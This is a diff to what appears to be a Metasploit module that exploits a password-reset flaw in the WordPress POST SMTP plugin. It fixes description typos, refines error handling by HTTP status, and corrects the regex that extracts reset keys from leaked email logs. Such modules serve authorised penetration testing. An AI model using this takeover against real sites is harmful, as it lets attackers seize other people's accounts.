@@ -13,11 +13,11 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Wordpress POST SMTP Account Takeover',
         'Description' => %q{
-          POST SMTP, a WordPress plugin,
+          The POST SMTP WordPress plugin
           prior to 2.8.7 is affected by a privilege escalation where an unauthenticated
           user is able to reset the password of an arbitrary user. This is done by
           requesting a password reset, then viewing the latest email logs to find
-          the associated passowrd reset email.
+          the associated password reset email.
         },
         'Author' => [
           'h00die', # msf module
@@ -55,7 +55,9 @@ class MetasploitModule < Msf::Auxiliary
       'headers' => { 'fcm-token' => token, 'device' => device }
     )
     fail_with(Failure::Unreachable, 'Connection failed') unless res
-    fail_with(Failure::UnexpectedReply, 'Request Failed to return a successful response') unless res.code == 200 # 404 if the URL structure is wonky, 401 not vulnerable
+    fail_with(Failure::UnexpectedReply, 'Request Failed to return a successful response, likely not vulnerable') if res.code == 401
+    fail_with(Failure::UnexpectedReply, 'Request Failed to return a successful response, likely unpredicted URL structure') if res.code == 404
+    fail_with(Failure::UnexpectedReply, 'Request Failed to return a successful response') unless res.code == 200
     print_good("Succesfully created token: #{token}")
     return token, device
   end
@@ -107,7 +109,8 @@ class MetasploitModule < Msf::Auxiliary
     )
     print_good("Full text of log saved to: #{path}")
     # https://rubular.com/r/DDQpKElcH42Qxg
-    if res.body =~ /(^.*key=.+$)/
+    # example URL http://127.0.0.1:5555/wp-login.php?action=rp&key=vy0MNNZZeykpDMArmJgu&login=admin&wp_lang=en_US
+    if res.body =~ /^(.*key=.+)$/
       print_good("Reset URL: #{::Regexp.last_match(1)}")
       return
     end
